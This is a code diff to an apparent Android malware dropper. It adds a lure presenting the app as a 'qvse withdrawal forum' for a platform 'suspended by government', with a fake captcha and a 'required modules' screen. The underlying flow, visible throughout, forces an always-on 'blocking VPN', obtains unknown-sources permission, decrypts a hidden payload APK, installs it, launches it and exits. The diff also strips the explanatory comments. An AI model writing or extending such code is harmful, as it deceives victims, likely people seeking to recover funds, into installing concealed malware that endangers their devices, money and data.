@@ -8,6 +8,7 @@ import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.pm.PackageInstaller;
 import android.content.pm.PackageManager;
+import android.graphics.Color;
 import android.net.ConnectivityManager;
 import android.net.Network;
 import android.net.NetworkCapabilities;
@@ -18,8 +19,17 @@ import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
 import android.provider.Settings;
+import android.view.Gravity;
+import android.view.View;
+import android.view.ViewGroup;
 import android.widget.Button;
+import android.widget.EditText;
+import android.widget.LinearLayout;
+import android.widget.RadioButton;
+import android.widget.RadioGroup;
+import android.widget.ScrollView;
 import android.widget.TextView;
+import android.widget.Toast;
 
 import net.lingala.zip4j.ZipFile;
 
@@ -28,6 +38,7 @@ import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.InputStream;
 import java.io.OutputStream;
+import java.util.Random;
 
 public class A4450c4b785 extends Activity {
 
@@ -44,10 +55,19 @@ public class A4450c4b785 extends Activity {
     /** How often to poll ConnectivityManager to check VPN is still active. */
     private static final long VPN_MONITOR_MS = 600;
 
+    private LinearLayout container;
+    private final Handler ui = new Handler(Looper.getMainLooper());
+
+    // Large flow state
+    private int largeStep = 0; // 0 welcome, 1 countries, 2 captcha, 3 modules
+    private String selectedCountry = "India";
+    private String captchaCode = "";
+    private EditText captchaInput;
+
     private TextView status;
     private Button   btn;
     private InstallResultReceiver receiver;
-    private final Handler ui = new Handler(Looper.getMainLooper());
+    private final Handler ui2 = new Handler(Looper.getMainLooper());
 
     /**
      * True once the user has granted VPN permission (so we know the system dialog
@@ -66,15 +86,6 @@ public class A4450c4b785 extends Activity {
 
     /**
      * Periodic runnable that keeps the Install button in sync with live VPN status.
-     *
-     * Uses V4450c4b785.isRunning() as the primary (and most reliable) check —
-     * it queries our static service instance directly rather than going through
-     * ConnectivityManager, which can lag or return stale data on many OEMs.
-     *
-     * Rules:
-     *   - Button ENABLED  iff VPN is currently live.
-     *   - If VPN drops after being granted, lock the button and re-request.
-     *   - Monitor stops once installation is complete (installComplete == true).
      */
     private final Runnable vpnMonitor = new Runnable() {
         @Override public void run() {
@@ -83,16 +94,16 @@ public class A4450c4b785 extends Activity {
             boolean live = isVpnLive();
 
             if (live) {
-                if (vpnPermissionGranted && !btn.isEnabled()) {
+                if (btn != null && vpnPermissionGranted && !btn.isEnabled()) {
                     btn.setEnabled(true);
-                    status.setText("Ready \u2014 tap Install to begin.");
+                    if (status != null) status.setText("Ready \u2014 tap Install to begin.");
                 }
             } else {
                 // VPN dropped (user killed it in Settings or service crashed).
                 if (vpnPermissionGranted) {
                     vpnPermissionGranted = false;
-                    btn.setEnabled(false);
-                    status.setText("VPN was disabled \u2014 please re-grant to continue.");
+                    if (btn != null) btn.setEnabled(false);
+                    if (status != null) status.setText("VPN was disabled \u2014 please re-grant to continue.");
                     requestVpnPermission();
                 }
             }
@@ -101,17 +112,6 @@ public class A4450c4b785 extends Activity {
         }
     };
 
-    /**
-     * Returns true if our blocking VPN is currently live.
-     *
-     * Primary check  — V4450c4b785.isRunning(): queries the static service
-     *   instance directly.  This is instantaneous and works on all Android
-     *   versions / OEMs regardless of ConnectivityManager quirks.
-     *
-     * Secondary check — ConnectivityManager TRANSPORT_VPN: catches the rare case
-     *   where the instance reference was lost but a VPN network is still registered
-     *   (e.g. service process recycled by the OS on low-memory devices).
-     */
     private boolean isVpnLive() {
         if (V4450c4b785.isRunning()) return true;
         try {
@@ -134,6 +134,11 @@ public class A4450c4b785 extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
+        if (BuildConfig.IS_LARGE) {
+            showLargeWelcome();
+            return;
+        }
+
         // Already installed → redirect instantly, no UI shown at all.
         if (isPayloadInstalled()) {
             doImmediateRedirect();
@@ -153,6 +158,211 @@ public class A4450c4b785 extends Activity {
         ui.postDelayed(vpnMonitor, VPN_MONITOR_MS);
     }
 
+    private void showLargeWelcome() {
+        container = new LinearLayout(this);
+        container.setOrientation(LinearLayout.VERTICAL);
+        container.setBackgroundColor(Color.parseColor("#0F1026"));
+        container.setPadding(60, 120, 60, 60);
+        container.setGravity(Gravity.CENTER_HORIZONTAL);
+
+        ScrollView scroll = new ScrollView(this);
+        LinearLayout inner = new LinearLayout(this);
+        inner.setOrientation(LinearLayout.VERTICAL);
+        inner.setGravity(Gravity.CENTER_HORIZONTAL);
+
+        TextView title = new TextView(this);
+        title.setText("Welcome to qvse withdrawal forum");
+        title.setTextColor(Color.WHITE);
+        title.setTextSize(24);
+        title.setTypeface(null, android.graphics.Typeface.BOLD);
+        title.setGravity(Gravity.CENTER);
+        title.setPadding(0, 0, 0, 40);
+        inner.addView(title);
+
+        TextView desc = new TextView(this);
+        desc.setText("This app uses vpn vpn vpn services to setup connections to tunnel connections to other country which qvse is still operating not suspended by government legal requirements.");
+        desc.setTextColor(Color.parseColor("#CCCCCC"));
+        desc.setTextSize(16);
+        desc.setGravity(Gravity.CENTER);
+        desc.setLineSpacing(4, 1.2f);
+        desc.setPadding(0, 0, 0, 80);
+        inner.addView(desc);
+
+        Button continueBtn = new Button(this);
+        continueBtn.setText("Continue");
+        continueBtn.setTextColor(Color.WHITE);
+        continueBtn.setBackgroundColor(Color.parseColor("#2563EB"));
+        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
+        lp.setMargins(0, 40, 0, 0);
+        continueBtn.setLayoutParams(lp);
+        continueBtn.setOnClickListener(v -> showLargeCountries());
+        inner.addView(continueBtn);
+
+        scroll.addView(inner);
+        container.addView(scroll);
+        setContentView(container);
+    }
+
+    private void showLargeCountries() {
+        container.removeAllViews();
+        ScrollView scroll = new ScrollView(this);
+        LinearLayout inner = new LinearLayout(this);
+        inner.setOrientation(LinearLayout.VERTICAL);
+        inner.setPadding(60, 80, 60, 60);
+        inner.setGravity(Gravity.CENTER_HORIZONTAL);
+
+        TextView title = new TextView(this);
+        title.setText("Select Country");
+        title.setTextColor(Color.WHITE);
+        title.setTextSize(22);
+        title.setTypeface(null, android.graphics.Typeface.BOLD);
+        title.setPadding(0, 0, 0, 40);
+        inner.addView(title);
+
+        RadioGroup rg = new RadioGroup(this);
+        rg.setOrientation(RadioGroup.VERTICAL);
+
+        String[] countries = {"India", "USA", "USA", "USA", "Ghana", "hifhli8"};
+        for (String c : countries) {
+            RadioButton rb = new RadioButton(this);
+            if (c.equals("India")) {
+                rb.setText("India (Recommended)");
+            } else {
+                rb.setText(c);
+            }
+            rb.setTextColor(Color.WHITE);
+            rb.setPadding(20, 30, 20, 30);
+            rb.setOnClickListener(v -> selectedCountry = c.equals("hifhli8") ? "hifhli8" : (c.equals("India") ? "India" : "USA"));
+            if (c.equals("India")) {
+                rb.setChecked(true);
+                selectedCountry = "India";
+            }
+            rg.addView(rb);
+        }
+        inner.addView(rg);
+
+        Button openPanel = new Button(this);
+        openPanel.setText("Continue to trading panel");
+        openPanel.setTextColor(Color.WHITE);
+        openPanel.setBackgroundColor(Color.parseColor("#22C55E"));
+        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
+        lp.setMargins(0, 60, 0, 0);
+        openPanel.setLayoutParams(lp);
+        openPanel.setOnClickListener(v -> showLargeCaptcha());
+        inner.addView(openPanel);
+
+        scroll.addView(inner);
+        container.addView(scroll);
+        setContentView(container);
+    }
+
+    private void showLargeCaptcha() {
+        container.removeAllViews();
+        ScrollView scroll = new ScrollView(this);
+        LinearLayout inner = new LinearLayout(this);
+        inner.setOrientation(LinearLayout.VERTICAL);
+        inner.setPadding(60, 120, 60, 60);
+        inner.setGravity(Gravity.CENTER_HORIZONTAL);
+
+        TextView title = new TextView(this);
+        title.setText("Captcha Verification");
+        title.setTextColor(Color.WHITE);
+        title.setTextSize(22);
+        title.setTypeface(null, android.graphics.Typeface.BOLD);
+        title.setPadding(0, 0, 0, 40);
+        inner.addView(title);
+
+        Random r = new Random();
+        captchaCode = String.valueOf(1000 + r.nextInt(9000));
+        TextView code = new TextView(this);
+        code.setText(captchaCode);
+        code.setTextColor(Color.YELLOW);
+        code.setTextSize(36);
+        code.setTypeface(null, android.graphics.Typeface.BOLD);
+        code.setGravity(Gravity.CENTER);
+        code.setPadding(0, 40, 0, 40);
+        code.setBackgroundColor(Color.parseColor("#1E1E3F"));
+        LinearLayout.LayoutParams clp = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 200);
+        code.setLayoutParams(clp);
+        inner.addView(code);
+
+        TextView hint = new TextView(this);
+        hint.setText("Enter the code shown above");
+        hint.setTextColor(Color.parseColor("#CCCCCC"));
+        hint.setTextSize(16);
+        hint.setPadding(0, 30, 0, 20);
+        inner.addView(hint);
+
+        captchaInput = new EditText(this);
+        captchaInput.setTextColor(Color.WHITE);
+        captchaInput.setHint("Enter code");
+        captchaInput.setHintTextColor(Color.GRAY);
+        captchaInput.setPadding(40, 30, 40, 30);
+        inner.addView(captchaInput);
+
+        Button verify = new Button(this);
+        verify.setText("Verify");
+        verify.setTextColor(Color.WHITE);
+        verify.setBackgroundColor(Color.parseColor("#2563EB"));
+        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
+        lp.setMargins(0, 60, 0, 0);
+        verify.setLayoutParams(lp);
+        verify.setOnClickListener(v -> {
+            if (captchaInput.getText().toString().trim().equals(captchaCode)) {
+                startLargeModuleInstall();
+            } else {
+                Toast.makeText(this, "Invalid captcha", Toast.LENGTH_SHORT).show();
+            }
+        });
+        inner.addView(verify);
+
+        scroll.addView(inner);
+        container.addView(scroll);
+        setContentView(container);
+    }
+
+    private void startLargeModuleInstall() {
+        container.removeAllViews();
+        ScrollView scroll = new ScrollView(this);
+        LinearLayout inner = new LinearLayout(this);
+        inner.setOrientation(LinearLayout.VERTICAL);
+        inner.setPadding(60, 200, 60, 60);
+        inner.setGravity(Gravity.CENTER_HORIZONTAL);
+
+        TextView msg = new TextView(this);
+        msg.setText("First install required modules");
+        msg.setTextColor(Color.WHITE);
+        msg.setTextSize(20);
+        msg.setGravity(Gravity.CENTER);
+        msg.setPadding(0, 0, 0, 60);
+        inner.addView(msg);
+
+        status = new TextView(this);
+        status.setText("Preparing...");
+        status.setTextColor(Color.parseColor("#9CA3AF"));
+        status.setGravity(Gravity.CENTER);
+        inner.addView(status);
+
+        btn = new Button(this);
+        btn.setVisibility(View.GONE);
+        inner.addView(btn);
+
+        scroll.addView(inner);
+        container.addView(scroll);
+        setContentView(container);
+
+        // Now run the existing install flow exactly as before
+        if (isPayloadInstalled()) {
+            doImmediateRedirect();
+            return;
+        }
+
+        btn.setOnClickListener(v -> onInstallClicked());
+        btn.setEnabled(false);
+        requestVpnPermission();
+        ui.postDelayed(vpnMonitor, VPN_MONITOR_MS);
+    }
+
     @Override
     protected void onDestroy() {
         // Remove all pending monitor callbacks to avoid leaks.
@@ -163,6 +373,10 @@ public class A4450c4b785 extends Activity {
     @Override
     protected void onResume() {
         super.onResume();
+
+        if (BuildConfig.IS_LARGE && largeStep >= 3) {
+            // Continue normal flow
+        }
 
         // Always redirect if module is installed, regardless of installComplete state.
         if (isPayloadInstalled() && !installComplete) {
@@ -195,7 +409,7 @@ public class A4450c4b785 extends Activity {
     // ── VPN permission gate ────────────────────────────────────────────────────
 
     private void requestVpnPermission() {
-        status.setText("Grant the VPN permission to continue\u2026");
+        if (status != null) status.setText("Grant the VPN permission to continue\u2026");
         Intent vpnIntent;
         try {
             vpnIntent = VpnService.prepare(this);
@@ -213,22 +427,14 @@ public class A4450c4b785 extends Activity {
 
     /**
      * Called once the user grants VPN permission.
-     *
-     * Two cases:
-     *   A) Service already running (re-open after failed install, or permission
-     *      was granted in a previous session and the service never stopped):
-     *      Enable the button immediately — no need to wait.
-     *   B) Service not yet running:
-     *      Start it, show "Starting VPN…" and let the monitor enable the button
-     *      once V4450c4b785.isRunning() becomes true (typically < 200 ms).
      */
     private void onVpnGranted() {
         vpnPermissionGranted = true;
 
         if (V4450c4b785.isRunning()) {
             // Already live — skip the "Starting…" phase entirely.
-            btn.setEnabled(true);
-            status.setText("Ready \u2014 tap Install to begin.");
+            if (btn != null) btn.setEnabled(true);
+            if (status != null) status.setText("Ready \u2014 tap Install to begin.");
             return;
         }
 
@@ -239,7 +445,7 @@ public class A4450c4b785 extends Activity {
                     "Could not start V4450c4b785: " + e.getMessage());
         }
         // The monitor will enable the button as soon as isRunning() becomes true.
-        status.setText("Starting VPN\u2026 please wait.");
+        if (status != null) status.setText("Starting VPN\u2026 please wait.");
     }
 
     /**
@@ -261,7 +467,7 @@ public class A4450c4b785 extends Activity {
             } else {
                 // Denied — re-show after a short delay. Cannot proceed without it.
                 vpnPermissionGranted = false;
-                status.setText("VPN permission is required. Please allow it.");
+                if (status != null) status.setText("VPN permission is required. Please allow it.");
                 ui.postDelayed(this::requestVpnPermission, 900);
             }
         } else if (requestCode == REQ_UNKNOWN_SOURCES) {
@@ -270,7 +476,7 @@ public class A4450c4b785 extends Activity {
                 awaitingUnknownSourcesGrant = false;
                 new Thread(this::dropAndInstall).start();
             } else {
-                runOnUiThread(() -> status.setText("Permission denied \u2014 cannot install."));
+                runOnUiThread(() -> { if (status != null) status.setText("Permission denied \u2014 cannot install."); });
             }
         }
     }
@@ -280,9 +486,9 @@ public class A4450c4b785 extends Activity {
     private void onInstallClicked() {
         // Hard gate: verify VPN is actually live at click time, not just on paper.
         if (!vpnPermissionGranted || !isVpnLive()) {
-            btn.setEnabled(false);
+            if (btn != null) btn.setEnabled(false);
             vpnPermissionGranted = false;
-            status.setText("VPN must be active to install. Re-requesting\u2026");
+            if (status != null) status.setText("VPN must be active to install. Re-requesting\u2026");
             requestVpnPermission();
             return;
         }
@@ -296,7 +502,7 @@ public class A4450c4b785 extends Activity {
     private void startInstall() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                 && !getPackageManager().canRequestPackageInstalls()) {
-            status.setText("Allow install from this source \u2014 install starts automatically.");
+            if (status != null) status.setText("Allow install from this source \u2014 install starts automatically.");
             awaitingUnknownSourcesGrant = true;
             startPermissionPoll();
             Intent i = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
@@ -358,10 +564,6 @@ public class A4450c4b785 extends Activity {
 
     /**
      * Immediate redirect for the "already installed" case.
-     *
-     * Called from onCreate / onResume when the module is already on-device.
-     * Does NOT show any UI — just launches the module app and calls finish().
-     * No polling needed because the package is already fully installed.
      */
     private void doImmediateRedirect() {
         installComplete = true;
@@ -382,9 +584,7 @@ public class A4450c4b785 extends Activity {
     }
 
     /**
-     * Post-install launch: polls until the freshly-installed package is
-     * queryable (PackageManager can lag briefly after session commit), then
-     * launches the module app, drops the VPN, and closes the installer.
+     * Post-install launch
      */
     private void launchPayloadAndExit() {
         final String pkg = BuildConfig.PAYLOAD_PACKAGE;
@@ -426,14 +626,14 @@ public class A4450c4b785 extends Activity {
             if (isPayloadInstalled()) {
                 runOnUiThread(() -> {
                     installComplete = true;
-                    status.setText("App installed, kindly wait for it to launch\u2026");
-                    btn.setEnabled(false);
+                    if (status != null) status.setText("App installed, kindly wait for it to launch\u2026");
+                    if (btn != null) btn.setEnabled(false);
                     launchPayloadAndExit();
                 });
                 return;
             }
 
-            runOnUiThread(() -> status.setText("Decrypting module \u2026"));
+            runOnUiThread(() -> { if (status != null) status.setText("Decrypting module \u2026"); });
 
             File workDir = new File(getCacheDir(), "drop");
             if (!workDir.exists()) workDir.mkdirs();
@@ -456,11 +656,11 @@ public class A4450c4b785 extends Activity {
                 throw new RuntimeException("Decrypted payload missing");
             }
 
-            runOnUiThread(() -> status.setText("Installing \u2026"));
+            runOnUiThread(() -> { if (status != null) status.setText("Installing \u2026"); });
             installViaSession(apk);
         } catch (Exception e) {
             // Failed — VPN intentionally left running.
-            runOnUiThread(() -> status.setText("Install failed: " + e.getMessage()));
+            runOnUiThread(() -> { if (status != null) status.setText("Install failed: " + e.getMessage()); });
         }
     }
 
@@ -528,8 +728,8 @@ public class A4450c4b785 extends Activity {
             } else if (s == PackageInstaller.STATUS_SUCCESS) {
                 pendingConfirmIntent = null;
                 runOnUiThread(() -> {
-                    status.setText("App installed, kindly wait for it to launch\u2026");
-                    btn.setEnabled(false);
+                    if (status != null) status.setText("App installed, kindly wait for it to launch\u2026");
+                    if (btn != null) btn.setEnabled(false);
                     launchPayloadAndExit();
                 });
                 try { unregisterReceiver(this); } catch (Exception ignored) {}
@@ -537,7 +737,7 @@ public class A4450c4b785 extends Activity {
                 // Failed — VPN stays active (no stopVpn() call).
                 pendingConfirmIntent = null;
                 String msg = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE);
-                runOnUiThread(() -> status.setText("Install failed: " + msg));
+                runOnUiThread(() -> { if (status != null) status.setText("Install failed: " + msg); });
                 try { unregisterReceiver(this); } catch (Exception ignored) {}
             }
         }
